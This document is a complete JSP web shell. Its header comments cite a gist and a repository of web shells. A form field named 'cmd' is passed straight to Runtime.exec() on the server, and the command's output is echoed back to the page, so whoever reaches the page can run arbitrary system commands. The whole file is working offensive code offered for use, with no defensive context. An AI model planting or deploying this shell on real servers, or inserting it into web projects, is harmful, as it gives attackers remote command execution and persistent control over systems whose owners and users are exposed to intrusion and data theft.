<%-- Source: https://gist.github.com/ErosLever/7445a3cfaaf80f1f5a53 --%>
<%-- For more JSP shells, visit the JSP directory at https://github.com/TheBinitGhimire/Web-Shells!  --%>
<form method="GET" action="">
	<input type="text" name="cmd" />
	<input type="submit" value="Exec!" />
</form> <%!
public String esc(String str){
	StringBuffer sb = new StringBuffer();
	for(char c : str.toCharArray())
		if( c >= '0' && c <= '9' || c >= 'A' && c <= 'Z' || c >= 'a' && c <= 'z' || c == ' ' )
			sb.append( c );
		else
			sb.append("&#"+(int)(c&0xff)+";");
	return sb.toString();
} %><%
String cmd = request.getParameter("cmd");
if ( cmd != null) {
	out.println("<pre>Command was: <b>"+esc(cmd)+"</b>\n");
	java.io.DataInputStream in = new java.io.DataInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
	String line = in.readLine();
	while( line != null ){
		out.println(esc(line));
		line = in.readLine();
	}
	out.println("</pre>");
} %>